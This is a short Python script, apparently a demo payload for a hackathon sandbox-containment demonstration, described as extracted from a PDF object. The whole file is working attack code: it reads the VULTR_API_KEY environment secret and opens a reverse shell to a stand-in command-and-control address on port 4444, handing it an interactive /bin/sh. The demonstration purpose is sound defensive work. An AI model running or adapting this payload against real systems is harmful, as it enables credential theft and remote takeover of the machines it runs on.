# Embedded Exploit Stream extracted from PDF Object 14
# Used for the Vultr Agent Rush Hackathon "Containment Moment" Demo
import socket, subprocess, os, sys

def execute_payload():
    print("[*] Hostile payload detonated inside container...")
    
    # 1. Attempting to harvest Vultr host secrets
    vultr_key = os.environ.get("VULTR_API_KEY", "NOT_FOUND")
    user_home = os.path.expanduser("~")
    print(f"[*] Probing environment secrets: VULTR_API_KEY={vultr_key}")
    
    # 2. Attempting reverse shell connect-back to hostile C2
    c2_host = "198.51.100.1"
    c2_port = 4444
    print(f"[*] Attempting outbound reverse shell socket to {c2_host}:{c2_port}...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((c2_host, c2_port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"[!] Socket halted or network sinkholed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    execute_payload()
